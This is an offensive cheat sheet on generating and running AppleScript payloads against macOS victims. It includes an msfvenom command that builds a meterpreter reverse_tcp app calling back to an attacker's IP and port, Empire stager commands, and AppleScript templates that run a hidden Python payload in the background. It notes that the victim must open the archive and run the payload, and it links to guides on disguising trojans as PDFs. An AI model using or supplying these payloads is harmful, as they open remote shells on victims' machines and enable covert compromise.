# AppleScript

## 01 - Generate Payloads

### 1.1 - #metasploit

```
$ msfvenom -p osx/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f osx-app -o payload.zip
```

### 1.2 - #empire 

```
(Empire) > usestager osx/applescript

(Empire: stager/osx/applescript) > set Listener <listener>

(Empire: stager/osx/applescript) > generate
```

### 1.3 - AppleScript Templates

```applescript
do shell script "echo \"<python_payload>\" | /usr/bin/python &"

do shell script "/usr/bin/python -c \"<python_payload>\" &"
```

## 02 - Execute Payloads

After the payload was generated. The victim must extract the archive file then execute the payload.

---
## References

### Backlinks

- [[Spoof Payloads|Helpers: Spoof Payloads]]

### Filesec

- [Filesec: `.applescript`](https://filesec.io/applescript)

### Null Byte

- [Null Byte: How to Create a Fake PDF Trojan with AppleScript, Part 1 (Creating the Stager)](https://null-byte.wonderhowto.com/how-to/hacking-macos-create-fake-pdf-trojan-with-applescript-part-1-creating-stager-0184692/)

- [Null Byte: How to Create a Fake PDF Trojan with AppleScript, Part 2 (Disguising the Script)](https://null-byte.wonderhowto.com/how-to/hacking-macos-create-fake-pdf-trojan-with-applescript-part-2-disguising-script-0184706/)